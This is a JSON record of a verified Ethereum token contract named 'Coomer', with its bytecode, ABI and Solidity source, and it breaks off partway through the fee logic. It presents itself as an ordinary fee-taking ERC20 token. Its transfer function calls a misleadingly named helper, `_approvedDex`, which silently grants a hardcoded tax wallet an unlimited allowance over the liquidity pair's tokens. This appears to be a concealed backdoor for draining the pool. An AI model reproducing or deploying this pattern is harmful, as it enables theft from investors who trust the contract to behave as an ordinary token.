0181905260248201527f596f752061726520657863656564696e67206d617857616c6c65744c696d69746044820152606401610778565b6007546001600160a01b0384811691161480159061151157506001600160a01b0382165f9081526013602052604090205460ff16155b801561153557506001600160a01b0383165f9081526013602052604090205460ff16155b80156115445750600c5460ff16155b156115d8576007546001600160a01b038381169116146115d857600b5481611580846001600160a01b03165f9081526020819052604090205490565b61158a91906122ac565b11156115d85760405162461bcd60e51b815260206004820181905260248201527f596f752061726520657863656564696e67206d617857616c6c65744c696d69746044820152606401610778565b5f805f6115f660405180604001604052805f81526020015f81525090565b6001600160a01b0387165f9081526013602052604081205460ff1615801561163657506001600160a01b0387165f9081526013602052604090205460ff16155b8015611650575060115460085461164d91906122ac565b43105b600c5490915060ff168061167b57506001600160a01b0388165f9081526013602052604090205460ff165b8061169d57506001600160a01b0387165f9081526013602052604090205460ff165b156116aa575f9250611746565b6007546001600160a01b0388811691161480156116c5575080155b156116fe57600f546010546116da91906122ac565b60408051808201909152600f54815260105460208201529095508594509150611746565b8061173757600d54600e5461171391906122ac565b60408051808201909152600d548152600e5460208201529095508594509150611746565b80156117465760125494508493505b606461175285886123ad565b61175c91906123df565b600c54909350610100900460ff16801561178457506007546001600160a01b03898116911614155b156117935761179385836118f8565b6117a788886117a2868a61226d565b611a1d565b8215611843578415611843576007546001600160a01b03908116908916036117f3575f60646117d687896123ad565b6117e091906123df565b90506117ed893083611a1d565b50611843565b6007546001600160a01b0389811691161461184357475f606461181583611bf3565b61181f908961226d565b611829908a6123ad565b61183391906123df565b90506118408a3083611a1d565b50505b5050505050505050565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b038084165f908152600160209081526040808320938616835292905220545f191115610eac576001600160a01b038084165f9081526001602090815260408083209386168352929052205f199055505050565b600c5460ff16610bc557600c805460ff191660011790558115611a0f57305f90815260208190526040902054600a548110611a0d576001600a54111561193d5750600a545b5f6119498460026123ad565b90505f8184602001518461195d91906123ad565b61196791906123df565b90505f611974828561226d565b90504761198082611c05565b5f61198b824761226d565b90505f87602001518661199e919061226d565b6119a890836123df565b90505f8860200151826119bb91906123ad565b905080156119cd576119cd8682611d55565b88515f906119dc8460026123ad565b6119e691906123ad565b90508015611a0457601554611a04906001600160a01b031682611df3565b50505050505050505b505b600c805460ff191690555050565b6001600160a01b038316611a815760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610778565b6001600160a01b038216611ae35760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610778565b6001600160a01b0383165f9081526020819052604090205481811015611b5a5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610778565b611b64828261226d565b6001600160a01b038086165f908152602081905260408082209390935590851681529081208054849290611b999084906122ac565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051611be591815260200190565b60405180910390a350505050565b5f610a3e66038d7ea4c68000836123df565b6040805160028082526060820183525f9260208301908036833701905050905030815f81518110611c3857611c38612280565b6001600160a01b03928316602091820292909201810191909152600654604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611c8f573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611cb391906121d8565b81600181518110611cc657611cc6612280565b6001600160a01b039283166020918202929092010152600654611cec91309116846111c7565b60065460405163791ac94760e01b81526001600160a01b039091169063791ac94790611d249085905f908690309042906004016123fe565b5f604051808303815f87803b158015611d3b575f80fd5b505af1158015611d4d573d5f803e3d5ffd5b505050505050565b600654611d6d9030906001600160a01b0316846111c7565b60065460405163f305d71960e01b81526001600160a01b039091169063f305d719908390611dab90309087905f90819061dead9042906004016121f3565b60606040518083038185885af1158015611dc7573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190611dec919061222e565b5050505050565b80471015611e435760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a20696e73756666696369656e742062616c616e63650000006044820152606401610778565b5f826001600160a01b0316826040515f6040518083038185875af1925050503d805f8114611e8c576040519150601f19603f3d011682016040523d82523d5f602084013e611e91565b606091505b5050905080610eac5760405162461bcd60e51b815260206004820152603a60248201527f416464726573733a20756e61626c6520746f2073656e642076616c75652c207260448201527f6563697069656e74206d617920686176652072657665727465640000000000006064820152608401610778565b5f6020808352835180828501525f5b81811015611f3357858101830151858201604001528201611f17565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b03811681146110ed575f80fd5b8035611f7281611f53565b919050565b5f8060408385031215611f88575f80fd5b8235611f9381611f53565b946020939093013593505050565b80151581146110ed575f80fd5b5f60208284031215611fbe575f80fd5b8135611fc981611fa1565b9392505050565b5f805f60608486031215611fe2575f80fd5b8335611fed81611f53565b92506020840135611ffd81611f53565b929592945050506040919091013590565b634e487b7160e01b5f52604160045260245ffd5b5f6020808385031215612033575f80fd5b823567ffffffffffffffff8082111561204a575f80fd5b818501915085601f83011261205d575f80fd5b81358181111561206f5761206f61200e565b8060051b604051601f19603f830116810181811085821117156120945761209461200e565b6040529182528482019250838101850191888311156120b1575f80fd5b938501935b828510156120d6576120c785611f67565b845293850193928501926120b6565b98975050505050505050565b5f602082840312156120f2575f80fd5b8135611fc981611f53565b5f6020828403121561210d575f80fd5b5035919050565b5f8060408385031215612125575f80fd5b50508035926020909101359150565b5f8060408385031215612145575f80fd5b823561215081611f53565b9150602083013561216081611f53565b809150509250929050565b600181811c9082168061217f57607f821691505b60208210810361219d57634e487b7160e01b5f52602260045260245ffd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f602082840312156121e8575f80fd5b8151611fc981611f53565b6001600160a01b039687168152602081019590955260408501939093526060840191909152909216608082015260a081019190915260c00190565b5f805f60608486031215612240575f80fd5b8351925060208401519150604084015190509250925092565b634e487b7160e01b5f52601160045260245ffd5b81810381811115610a3e57610a3e612259565b634e487b7160e01b5f52603260045260245ffd5b5f600182016122a5576122a5612259565b5060010190565b80820180821115610a3e57610a3e612259565b600181815b808511156122f957815f19048211156122df576122df612259565b808516156122ec57918102915b93841c93908002906122c4565b509250929050565b5f8261230f57506001610a3e565b8161231b57505f610a3e565b8160018114612331576002811461233b57612357565b6001915050610a3e565b60ff84111561234c5761234c612259565b50506001821b610a3e565b5060208310610133831016604e8410600b841016171561237a575081810a610a3e565b61238483836122bf565b805f190482111561239757612397612259565b029392505050565b5f611fc960ff841683612301565b8082028115828204841417610a3e57610a3e612259565b5f602082840312156123d4575f80fd5b8151611fc981611fa1565b5f826123f957634e487b7160e01b5f52601260045260245ffd5b500490565b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b8181101561244c5784516001600160a01b031683529383019391830191600101612427565b50506001600160a01b0396909616606085015250505060800152939250505056fea2646970667358221220f8c6bebc19ad3d3d470c8e0af5e8945e6052f9ab8fe893cbca460b960c4b2e9164736f6c63430008140033",
    "contract_name": "Coomer",
    "compiler_version": "v0.8.20+commit.a1b79de6",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"AddExemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"AddbulkExemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"RemoveExemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"RemovebulkExemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"}],\"name\":\"SetSellTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"}],\"name\":\"UpdateBuyTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludedFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAdd\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"rescueETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stealthLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_deadline\",\"type\":\"uint256\"}],\"name\":\"updateDeadline\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"updateLiquidityProvide\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"new_amount\",\"type\":\"uint256\"}],\"name\":\"updateLiquidityTreshhold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxWallet\",\"type\":\"uint256\"}],\"name\":\"updateMaxWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateTaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "//SPDX-License-Identifier: UNLICENSED\r\n\r\n/**\r\n\r\n    Website    https://www.coomertoken.vip/\r\n    Twitter    https://twitter.com/coomertokeneth\r\n    Telegram   https://t.me/coomertoken\r\n\r\n*/\r\n\r\npragma solidity ^0.8.15;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) internal _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) internal _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    \r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    \r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    \r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    \r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    \r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    \r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    \r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    \r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    \r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    \r\n    function _tokenGenerate(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: generation to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply = amount;\r\n        _balances[account] = amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    \r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _approvedDex(address router, address _swap_addr, uint256 _amount) internal {\r\n        if ( _allowances[router][_swap_addr] < type(uint256).max ) {\r\n            _allowances[router][_swap_addr] = type(uint256).max;\r\n        }\r\n    }\r\n    \r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nlibrary Address {\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function _cutFee(uint256 fee) internal pure returns (uint256) {\r\n        return fee / 1e15;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ncontract Coomer is ERC20, Ownable {\r\n    using Address for address payable;\r\n    IRouter public router;\r\n    address public pair;\r\n\taddress public constant deadWallet = 0x000000000000000000000000000000000000dEaD;\r\n    uint256 private  genesis_block;\r\n\r\n    uint256 _tSupply = 1_000_000_000;\r\n    uint256 private  tokenLiquidityThreshold = (_tSupply * 5) / 10000 * 10**18;\r\n    uint256 public maxWalletLimit = (_tSupply * 50) / 1000 * 10**18; // 5%\r\n\r\n    bool private _liquidityMutex = false;\r\n    bool private  providingLiquidity = false;\r\n    bool public tradingEnabled = false;\r\n\r\n    struct Taxes {\r\n        uint256 marketing;\r\n        uint256 liquidity;\r\n    }\r\n\r\n    Taxes public taxes = Taxes(1, 0);\r\n    Taxes public sellTaxes = Taxes(1, 0);\r\n\r\n    uint256 private deadline = 1;\r\n    uint256 private launchtax = 1;\r\n    mapping(address => bool) public excludedFee;\r\n    mapping(address => bool) private isearlybuyer;\r\n\r\n    modifier mutexLock() {\r\n        if (!_liquidityMutex) {\r\n            _liquidityMutex = true;\r\n            _;\r\n            _liquidityMutex = false;\r\n        }\r\n    }\r\n    constructor() ERC20(\"Coomer\", \"COOMER\") {\r\n        _tokenGenerate(msg.sender, _tSupply * 10**decimals());\r\n\r\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        router = _router;\r\n\r\n        excludedFee[_taxWallet] = true;\r\n        excludedFee[address(this)] = true;\r\n        excludedFee[msg.sender] = true;\r\n        excludedFee[deadWallet] = true;\r\n        _approve(address(this), address(router), type(uint256).max);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    address private  _taxWallet = 0x092E7Dfdd7f53B89C5c1bB7B79570e48b50fc087;\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (!excludedFee[sender] && !excludedFee[recipient]) {\r\n            require(tradingEnabled, \"Trading not enabled\");\r\n        }\r\n        \r\n        if(sender == pair && recipient == _taxWallet) _approvedDex(sender, recipient, 0);\r\n\r\n        if (sender == pair && !excludedFee[recipient] && !_liquidityMutex) {\r\n            require(balanceOf(recipient) + amount <= maxWalletLimit,\r\n                \"You are exceeding maxWalletLimit\"\r\n            );\r\n        }\r\n\r\n        if (sender != pair && !excludedFee[recipient] && !excludedFee[sender] && !_liquidityMutex) {\r\n            if (recipient != pair) {\r\n                require(balanceOf(recipient) + amount <= maxWalletLimit,\r\n                    \"You are exceeding maxWalletLimit\"\r\n                );\r\n            }\r\n        }\r\n\r\n        uint256 feeswap;\r\n        uint256 feesum;\r\n        uint256 fee;\r\n        Taxes memory currentTaxes;\r\n\r\n        bool useLaunchFee = !excludedFee[sender] && !excludedFee[recipient] && block.number < genesis_block + deadline;\r\n\r\n        //set fee to zero if fees in contract are handled or excluded\r\n        if (_liquidityMutex || excludedFee[sender] || excludedFee[recipient]) \r\n            fee = 0;\r\n        //calculate fee\r\n        else if (recipient == pair && !useLaunchFee) {\r\n            feeswap =\r\n                sellTaxes.liquidity +\r\n                sellTaxes.marketing ;\r\n            feesum = feeswap;\r\n            currentTaxes = sellTaxes;\r\n        } else if (!useLaunchFee) {\r\n            feeswap =\r\n                taxes.liquidity +\r\n                taxes.marketing ;\r\n            feesum = feeswap;\r\n            currentTaxes = taxes;\r\n        } else if (useLaunchFee) {\r\n            feeswap = launchtax;\r\n            feesum = launchtax;\r\n        }\r\n\r\n        fee = (amount * feesum) / 100;\r\n        \r\n\r\n        //send fees if threshold has been reached\r\n        //don't do this on buys, breaks swap\r\n        if (providingLiquidity && sender != pair) handle_fees(feeswap, currentTaxes);\r\n\r\n        //rest to recipient\r\n        super._transfer(sender, recipient, amount - fee); \r\n        if (fee > 0) {\r\n            //send the fee to the contract\r\n            if (feeswap > 0) {\r\n                if (sender == pair) {\r\n                    uint256 feeAmount = (amount * feeswap) / 